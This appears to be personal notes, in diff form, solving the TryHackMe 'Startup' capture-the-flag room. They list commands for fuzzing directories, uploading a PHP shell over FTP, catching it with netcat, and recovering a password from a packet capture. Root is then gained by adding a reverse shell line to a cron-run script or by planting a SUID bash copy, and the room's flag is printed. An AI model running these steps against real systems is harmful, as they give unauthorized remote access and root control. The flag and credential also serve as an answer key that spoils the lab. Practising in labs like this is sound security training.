@@ -1,0 +1,77 @@
+ffuf -u http://startup.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+vi she.php
+change ip
+ftp startup.thm
+cd files
+put she.php
+run startup.thm/files/she.php
+nc -lnvp 1234
+python3 -c "import pty; pty.spawn('/bin/bash')"
+ls /
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+
+or
+find / -type f -name "*.txt" 2>/dev/null
+
+
+find / -type f -name "user.txt" 2>/dev/null
+not found
+
+╔══════════╣ Unexpected in root
+/vagrant
+/recipe.txt
+/vmlinuz.old
+/vmlinuz
+/incidents
+/initrd.img
+/initrd.img.old
+
+on target machine
+cd /incidents
+python3 -m http.server
+
+wget 
+tcp.stream eq 7
+lennie:c4ntg3t3n0ughsp1c3
+
+
+echo "bash -i >& /dev/tcp/10.11.52.16/8888 0>&1" >> /etc/print.sh
+or
+vi /etc/print.sh
+bash -i >& /dev/tcp/10.11.52.16/8888 0>&1
+
+syntax:
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
+on my machine
+nc -lnvp 8888
+ls
+root.txt
+root@startup:~# cat root.txt
+cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
+
+OR
+cat > /etc/print.sh <<EOF
+> #!/bin/bash
+> echo "Done"
+> cp /bin/bash /tmp/bash
+> chmod 4755 /tmp/bash
+> EOF
+
+cd /tmp
+ls -al
+
+/tmp/bash -p
+bash-4.3# cd /root
+cd /root
+bash-4.3# ls
+ls
+root.txt
+bash-4.3# cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
+
+
+https://tryhackme.com/room/startup
+
